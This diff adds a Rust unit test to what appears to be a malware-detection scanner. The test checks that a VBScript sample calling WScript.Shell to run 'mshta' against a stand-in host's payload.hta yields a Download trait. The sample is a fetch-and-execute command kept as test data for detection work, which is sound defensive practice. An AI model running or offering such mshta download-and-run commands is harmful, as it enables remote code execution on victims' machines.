@@ -14174,6 +14174,25 @@ sh.Run "mshta vbs-run-schemeless.example/payload.hta", 0, False"#;
     }
 
     #[test]
+    fn vbs_wscript_shell_exec_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Exec "mshta vbs-exec.example/payload.hta""#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-exec.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS WScript.Shell.Exec schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_wscript_shell_run_inline_concat_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Set sh = CreateObject("WScript.Shell")
